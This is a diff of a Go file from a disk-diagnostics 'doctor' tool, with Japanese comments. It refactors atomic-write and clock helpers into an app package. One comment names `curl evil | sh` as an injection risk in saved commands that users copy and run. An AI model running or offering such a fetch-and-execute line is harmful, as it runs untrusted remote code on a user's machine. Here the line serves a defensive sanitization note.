@@ -13,6 +13,7 @@ import (
 	"doctor/disk"
 	"doctor/svc"
 	"github.com/jiikko/dotfiles/src/termsafe"
+	"glogx/internal/app"
 )
 
 // doctor のディスク診断結果の保存と、起動時トースト (issue 148 の 3 章)。
@@ -227,8 +228,8 @@ func saveDoctorDiskCache(c doctorDiskCache) error {
 	// 🚨 独自の temp + rename を書かない (issue 219)。以前ここに在った
 	// `<path>.tmp.<pid>` + os.WriteFile は **rename 分岐だけ**を写していたので、ENOSPC で
 	// write が失敗すると 0 バイトの残骸が残った (doctor は「ディスクが足りない」ときに開く
-	// 画面なので、一番残骸が出てほしくない状況で出る)。writeAtomic は 3 分岐すべて掃除する。
-	return writeAtomic(path, data)
+	// 画面なので、一番残骸が出てほしくない状況で出る)。app.WriteAtomic は 3 分岐すべて掃除する。
+	return app.WriteAtomic(path, data)
 }
 
 // loadDoctorDiskCache は保存結果を返す。欠損・破損は「結果なし」(起動を失敗させない。クラッシュもしない)。
@@ -407,8 +408,8 @@ func saveDoctorSnapshot(sn doctorSnapshot) error {
 	// 🚨 独自の temp + rename を書かない (issue 219)。以前ここに在った
 	// `<path>.tmp.<pid>` + os.WriteFile は **rename 分岐だけ**を写していたので、ENOSPC で
 	// write が失敗すると 0 バイトの残骸が残った (doctor は「ディスクが足りない」ときに開く
-	// 画面なので、一番残骸が出てほしくない状況で出る)。writeAtomic は 3 分岐すべて掃除する。
-	return writeAtomic(path, data)
+	// 画面なので、一番残骸が出てほしくない状況で出る)。app.WriteAtomic は 3 分岐すべて掃除する。
+	return app.WriteAtomic(path, data)
 }
 
 // loadDoctorSnapshot は TTL 内の完全な結果を返す。欠損・破損・期限切れ・未来の時刻は「無し」(走査に倒す)。
@@ -437,7 +438,7 @@ func loadDoctorSnapshotAny() (doctorSnapshot, bool) {
 	if err := json.Unmarshal(data, &sn); err != nil || sn.ScannedAt.IsZero() {
 		return doctorSnapshot{}, false
 	}
-	sn.Disk = sn.Disk.WithResults(sanitizeSnapshotResults(sn.Disk.Results, timeNow()))
+	sn.Disk = sn.Disk.WithResults(sanitizeSnapshotResults(sn.Disk.Results, app.TimeNow()))
 	// サービス節と brew 節も同じ境界を通す。サービスの Commands は「手で実行してください」と
 	// 提示して Y でコピーさせるので、保存された文字列をそのまま信じると `curl evil | sh` を
 	// コピー経路に載せられる (issue 178 の敵対レビューが再現した)
